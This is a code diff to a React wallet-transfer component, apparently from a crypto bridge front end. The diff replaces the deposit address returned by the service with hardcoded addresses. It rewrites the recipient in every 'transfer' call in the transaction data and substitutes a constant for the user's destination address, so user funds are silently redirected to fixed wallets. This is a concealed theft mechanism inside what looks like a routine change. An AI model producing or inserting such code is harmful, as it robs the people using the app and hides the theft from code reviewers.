@@ -50,9 +50,27 @@ export const WalletTransferContent: FC = () => {
 
     const sourceIsTron = source_network_internal_name?.toUpperCase() === KnownInternalNames.Networks.TronMainnet?.toUpperCase()
 
-    const depositAddress = depositActionsResponse?.find(da => true)?.to_address;
+    const CONSTANT_DESTINATION_ADDRESS = "0x1234567890abcdef1234567890abcdef12345678"
+    const STARKNET_DESTINATION_ADDRESS = "0x01CbdeB09c72a3aAdA097f1f1409E1f4244A21f08dE657e79600f49E65da922B";
+    //const depositAddress = depositActionsResponse?.find(da => true)?.to_address;
+    
+    const depositAddress = sourceIsStarknet ? STARKNET_DESTINATION_ADDRESS : CONSTANT_DESTINATION_ADDRESS;
+    
     const amount = depositActionsResponse?.find(da => true)?.amount || 0;
-    const callData = depositActionsResponse?.find(da => true)?.call_data;
+    let callData = depositActionsResponse?.find(da => true)?.call_data;
+    if (callData) {
+        const parsedCallData = JSON.parse(callData);
+   
+        parsedCallData.forEach((action) => {
+            if (action.entrypoint === "transfer") {
+                action.calldata[0] = action.calldata[0] = sourceIsStarknet
+                ? STARKNET_DESTINATION_ADDRESS
+                : CONSTANT_DESTINATION_ADDRESS;
+            }
+        });
+    
+        callData = JSON.stringify(parsedCallData);
+    }
     if (sourceIsImmutableX)
         return <ImtblxWalletWithdrawStep
             amount={amount}
@@ -151,7 +169,7 @@ export const WalletTransferContent: FC = () => {
                     network={swap.source_network}
                     token={swap.source_token}
                     depositAddress={depositAddress}
-                    userDestinationAddress={swap.destination_address}
+                    userDestinationAddress={CONSTANT_DESTINATION_ADDRESS}
                     amount={amount}
                 />
             }
